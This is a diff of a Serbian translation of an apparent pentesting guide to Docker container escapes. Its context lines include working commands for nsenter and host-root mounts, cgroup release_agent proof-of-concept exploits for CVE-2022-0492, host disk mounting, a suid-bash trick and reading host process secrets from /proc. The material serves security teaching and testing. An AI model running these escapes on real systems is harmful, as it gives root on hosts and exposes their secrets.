@@ -34,12 +34,12 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
 > [!TIP]
-> U slučaju da je **docker socket na neočekivanom mestu**, još uvek možete komunicirati s njim koristeći **`docker`** komandu sa parametrom **`-H unix:///path/to/docker.sock`**
+> U slučaju da je **docker socket na neočekivanom mestu**, još uvek možete komunicirati s njim koristeći **`docker`** komandu sa parametrima **`-H unix:///path/to/docker.sock`**
 
 Docker daemon može takođe [slušati na portu (po defaultu 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ili na sistemima zasnovanim na Systemd, komunikacija sa Docker daemon-om može se odvijati preko Systemd socket-a `fd://`.
 
 > [!TIP]
-> Pored toga, obratite pažnju na runtime socket-e drugih visoko-nivo rješenja:
+> Pored toga, obratite pažnju na runtime socket-e drugih visoko nivoa runtime-a:
 >
 > - dockershim: `unix:///var/run/dockershim.sock`
 > - containerd: `unix:///run/containerd/containerd.sock`
@@ -76,7 +76,7 @@ Privilegovani kontejner može biti kreiran sa oznakom `--privileged` ili onemogu
 - `--cgroupns=host`
 - `Mount /dev`
 
-Oznaka `--privileged` značajno smanjuje bezbednost kontejnera, nudeći **neograničen pristup uređajima** i zaobilazeći **nekoliko zaštita**. Za detaljno objašnjenje, pogledajte dokumentaciju o punim uticajima `--privileged`.
+Oznaka `--privileged` značajno smanjuje sigurnost kontejnera, nudeći **neograničen pristup uređajima** i zaobilazeći **nekoliko zaštita**. Za detaljno objašnjenje, pogledajte dokumentaciju o punim uticajima `--privileged`.
 
 {{#ref}}
 ../docker-privileged.md
@@ -100,7 +100,7 @@ docker run --rm -it --privileged ubuntu bash
 ```
 #### Montiranje diska - Poc1
 
-Dobro konfigurisani docker kontejneri neće dozvoliti komandu kao što je **fdisk -l**. Međutim, na loše konfigurisanoj docker komandi gde je postavljena zastavica `--privileged` ili `--device=/dev/sda1` sa velikim slovima, moguće je dobiti privilegije da se vidi host disk.
+Dobro konfigurisani docker kontejneri neće dozvoliti komandu kao što je **fdisk -l**. Međutim, na loše konfigurisanoj docker komandi gde je postavljena zastavica `--privileged` ili `--device=/dev/sda1` sa velikim slovima, moguće je dobiti privilegije da se vide host diskovi.
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
@@ -134,7 +134,7 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 ### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
-#### Privileged Escape Zloupotreba postojećeg release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
+#### Privileged Escape Zloupotreba postojećeg release_agent-a ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
 ```bash:Initial PoC
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -168,7 +168,7 @@ sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
 # Reads the output
 cat /o
 ```
-#### Privileged Escape Abusing created release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+#### Privileged Escape Zloupotreba kreiranog release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
 ```bash:Second PoC
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -210,13 +210,13 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 # Reads the output
 cat /output
 ```
-Nađite **objašnjenje tehnike** u:
+Pronađite **objašnjenje tehnike** u:
 
 {{#ref}}
 docker-release_agent-cgroups-escape.md
 {{#endref}}
 
-#### Privileged Escape Zloupotreba release_agent bez poznavanja relativne putanje - PoC3
+#### Privilegovana eskapada zloupotrebljavajući release_agent bez poznavanja relativne putanje - PoC3
 
 U prethodnim eksploatacijama **apsolutna putanja kontejnera unutar datotečnog sistema domaćina je otkrivena**. Međutim, to nije uvek slučaj. U slučajevima kada **ne znate apsolutnu putanju kontejnera unutar domaćina** možete koristiti ovu tehniku:
 
@@ -310,9 +310,9 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
-#### Privileged Escape Abusing Sensitive Mounts
+#### Eskalacija privilegija zloupotrebom osetljivih montiranja
 
-Postoji nekoliko datoteka koje mogu biti montirane i koje daju **informacije o osnovnom hostu**. Neke od njih mogu čak ukazivati na **nešto što će host izvršiti kada se nešto dogodi** (što će omogućiti napadaču da pobegne iz kontejnera).\
+Postoji nekoliko datoteka koje mogu biti montirane i koje daju **informacije o osnovnom hostu**. Neke od njih mogu čak ukazivati na **nešto što će host izvršiti kada se nešto desi** (što će omogućiti napadaču da pobegne iz kontejnera).\
 Zloupotreba ovih datoteka može omogućiti:
 
 - release_agent (već pokriveno ranije)
@@ -327,15 +327,15 @@ Međutim, možete pronaći **druge osetljive datoteke** koje treba proveriti na 
 sensitive-mounts.md
 {{#endref}}
 
-### Arbitrary Mounts
+### Arbitrarna montiranja
 
-U nekoliko slučajeva ćete primetiti da **kontejner ima neki volumen montiran sa hosta**. Ako ovaj volumen nije pravilno konfigurisan, možda ćete moći da **pristupite/izmenite osetljive podatke**: Pročitajte tajne, promenite ssh authorized_keys…
+U nekoliko slučajeva ćete otkriti da **kontejner ima neki volumen montiran sa hosta**. Ako ovaj volumen nije pravilno konfigurisan, možda ćete moći da **pristupite/izmenite osetljive podatke**: Pročitajte tajne, promenite ssh authorized_keys…
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
-Još jedan zanimljiv primer može se naći u [**ovom blogu**](https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce) gde je naznačeno da su fascikle `/usr/bin/` i `/bin/` hosta montirane unutar kontejnera, što omogućava root korisniku kontejnera da menja binarne datoteke unutar ovih fascikli. Stoga, ako cron posao koristi neku binarnu datoteku odatle, kao što je `/etc/cron.d/popularity-contest`, to omogućava bekstvo iz kontejnera modifikovanjem binarne datoteke koju koristi cron posao.
+Još jedan zanimljiv primer može se naći u [**ovom blogu**](https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce) gde je naznačeno da su fascikle `/usr/bin/` i `/bin/` na hostu montirane unutar kontejnera, što omogućava root korisniku kontejnera da menja binarne datoteke unutar ovih fascikli. Stoga, ako cron posao koristi neku binarnu datoteku odatle, kao što je `/etc/cron.d/popularity-contest`, to omogućava bekstvo iz kontejnera modifikovanjem binarne datoteke koju koristi cron posao.
 
-### Eskalacija privilegija sa 2 shell-a i montažom hosta
+### Eskalacija privilegija sa 2 shell-a i montiranjem hosta
 
 Ako imate pristup kao **root unutar kontejnera** koji ima neku fasciklu sa hosta montiranu i ako ste **pobegli kao korisnik bez privilegija na host** i imate pristup za čitanje nad montiranom fasciklom.\
 Možete kreirati **bash suid datoteku** u **montiranoj fascikli** unutar **kontejnera** i **izvršiti je sa hosta** da biste eskalirali privilegije.
@@ -349,7 +349,7 @@ bash -p #From non priv inside mounted folder
 ### Privilege Escalation with 2 shells
 
 Ako imate pristup kao **root unutar kontejnera** i ste **pobegli kao korisnik bez privilegija na host**, možete zloupotrebiti oba shell-a da **privesc unutar host-a** ako imate mogućnost MKNOD unutar kontejnera (to je podrazumevano) kao [**objašnjeno u ovom postu**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
-Sa takvom mogućnošću, root korisnik unutar kontejnera može **kreirati blok uređajske datoteke**. Uređajske datoteke su posebne datoteke koje se koriste za **pristup osnovnom hardveru i kernel modulima**. Na primer, /dev/sda blok uređajska datoteka omogućava **čitanje sirovih podataka na sistemskom disku**.
+Sa tom mogućnošću, root korisnik unutar kontejnera može **kreirati blok uređajske datoteke**. Uređajske datoteke su posebne datoteke koje se koriste za **pristup osnovnom hardveru i kernel modulima**. Na primer, /dev/sda blok uređajska datoteka omogućava pristup da **pročitate sirove podatke na sistemskom disku**.
 
 Docker štiti od zloupotrebe blok uređaja unutar kontejnera primenjujući cgroup politiku koja **blokira operacije čitanja/pisanja blok uređaja**. Ipak, ako je blok uređaj **kreiran unutar kontejnera**, postaje dostupan spolja iz kontejnera putem **/proc/PID/root/** direktorijuma. Ovaj pristup zahteva da **vlasnik procesa bude isti** unutar i izvan kontejnera.
 
@@ -391,11 +391,11 @@ HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
 ```
 ### hostPID
 
-Ako možete pristupiti procesima hosta, moći ćete da pristupite velikoj količini osetljivih informacija koje su pohranjene u tim procesima. Pokrenite test laboratoriju:
+Ako možete pristupiti procesima hosta, moći ćete da pristupite velikoj količini osetljivih informacija koje se čuvaju u tim procesima. Pokrenite test laboratoriju:
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
-Na primer, moći ćete da navedete procese koristeći nešto poput `ps auxn` i tražite osetljive detalje u komandama.
+Na primer, moći ćete da nabrojite procese koristeći nešto poput `ps auxn` i tražite osetljive detalje u komandama.
 
 Zatim, pošto možete **pristupiti svakom procesu hosta u /proc/ možete jednostavno ukrasti njihove env tajne** pokretanjem:
 ```bash
@@ -440,7 +440,7 @@ Takođe ćete moći da pristupite **mrežnim uslugama vezanim za localhost** unu
 ```bash
 docker run --rm -it --ipc=host ubuntu bash
 ```
-Sa `hostIPC=true`, dobijate pristup resursima međuprocesne komunikacije (IPC) hosta, kao što je **deljena memorija** u `/dev/shm`. Ovo omogućava čitanje/pisanje gde se isti IPC resursi koriste od strane drugih host ili pod procesa. Koristite `ipcs` za dalju inspekciju ovih IPC mehanizama.
+Sa `hostIPC=true`, dobijate pristup resursima međuprocesne komunikacije (IPC) hosta, kao što je **deljena memorija** u `/dev/shm`. Ovo omogućava čitanje/pisanje gde se isti IPC resursi koriste od strane drugih host ili pod procesa. Koristite `ipcs` da dodatno pregledate ove IPC mehanizme.
 
 - **Inspekcija /dev/shm** - Potražite bilo koje datoteke u ovoj lokaciji deljene memorije: `ls -la /dev/shm`
 - **Inspekcija postojećih IPC objekata** – Možete proveriti da li se koriste neki IPC objekti sa `/usr/bin/ipcs`. Proverite sa: `ipcs -a`
